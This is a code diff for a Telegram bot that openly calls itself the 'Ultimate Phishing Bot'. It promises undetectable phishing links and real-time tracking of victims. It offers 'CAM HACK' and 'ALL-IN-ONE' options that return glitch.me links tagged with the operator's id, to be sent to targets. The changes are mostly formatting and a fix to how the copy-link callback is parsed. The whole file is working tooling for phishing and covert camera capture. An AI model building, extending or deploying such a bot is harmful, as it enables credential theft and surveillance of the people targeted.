@@ -18,20 +18,19 @@ async def start_command(client, message):
         [InlineKeyboardButton("🛠 ALL-IN-ONE", callback_data="all_in_one"),
          InlineKeyboardButton("📸 CAM HACK", callback_data="camera_hack")]
     ])
-
-    welcome_text = (       
+    
+    welcome_text = (
         "🔰 <b>Welcome to the Ultimate Phishing Bot!</b> 🔰\n\n"
+        
         "🔥 Generate undetectable phishing links in seconds & send them to your targets!\n"
+        
         "🎯 Track victims in real-time & collect data effortlessly.\n\n"
+        
         "🛑 <b>Warning: High Security System Activated</b> 🛑\n\n"
         "⚠️ <i>Use responsibly! Any misuse is your own responsibility.</i> ⚠️"
     )
 
-    await message.reply_text(
-        welcome_text,
-        reply_markup=keyboard,
-        parse_mode=enums.ParseMode.HTML
-    )
+    await message.reply_text(welcome_text, reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)
 
 # 🔄 Callback Query Handler with Dynamic Loading Animation
 @app.on_callback_query()
@@ -53,10 +52,10 @@ async def callback_handler(client, callback_query):
             "🚀 𝐒", "🚀 𝐒𝐓", "🚀 𝐒𝐓𝐀", "🚀 𝐒𝐓𝐀𝐑", "🚀 𝐒𝐓𝐀𝐑𝐓",
             "🚀 𝐒𝐓𝐀𝐑𝐓𝐈", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍", "🚀 𝐒𝐓𝐀𝐑𝐓𝐈𝐍𝐆... 🔥"
         ]
-        loading_message = await callback_query.message.reply_text("S", parse_mode=enums.ParseMode.HTML)
-        
+        loading_message = await callback_query.message.reply_text("🚀 𝐒", parse_mode=enums.ParseMode.HTML)
+
         for stage in loading_stages[1:]:
-            await asyncio.sleep(0.1)  # Adjust the delay as needed
+            await asyncio.sleep(0.1)
             await loading_message.edit_text(stage)
 
         await asyncio.sleep(0.1)  # Short pause before deleting the loading message
@@ -65,12 +64,15 @@ async def callback_handler(client, callback_query):
         # 📝 Send the Generated Link with Copy Button
         message_text = (
             f"🛠 <b>Page Name:</b> <code>{page_name}</code>\n"
+            
+            
             f"🔗 <b>Link:</b> <code>{link}</code>\n\n"
+            
             f"🎯 Just send this to your target!"
         )
 
         copy_button = InlineKeyboardMarkup([
-            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{data}")]
+            [InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}_{data}")]
         ])
 
         await callback_query.message.reply_text(
@@ -82,19 +84,23 @@ async def callback_handler(client, callback_query):
 # 📋 Copy Link Handler
 @app.on_callback_query(filters.regex("^copy_"))
 async def copy_link_handler(client, callback_query):
-    data = callback_query.data.split("_", 1)[1]  # Extract the original callback data
-    user_id = callback_query.from_user.id
+    try:
+        _, user_id, data = callback_query.data.split("_", 2)  # Extract user_id and data
+        user_id = int(user_id)  # Convert user_id back to integer
+        
+        links = {
+            "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
+            "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
+        }
 
-    links = {
-        "all_in_one": f"https://trail-charm-waterlily.glitch.me/?id={user_id}",
-        "camera_hack": f"https://four-political-blouse.glitch.me/?id={user_id}"
-    }
-
-    if data in links:
-        link = links[data]
-        await callback_query.answer(f"📋 Copied: {link}", show_alert=True)
-    else:
-        await callback_query.answer("❌ Link not found!", show_alert=True)
+        if data in links:
+            link = links[data]
+            await callback_query.answer(f"📋 Copied: {link}", show_alert=True)
+        else:
+            await callback_query.answer("❌ Link not found!", show_alert=True)
+    
+    except Exception as e:
+        await callback_query.answer("⚠️ Error copying link!", show_alert=True)
 
 # 🚀 Run the Bot
 if __name__ == "__main__":
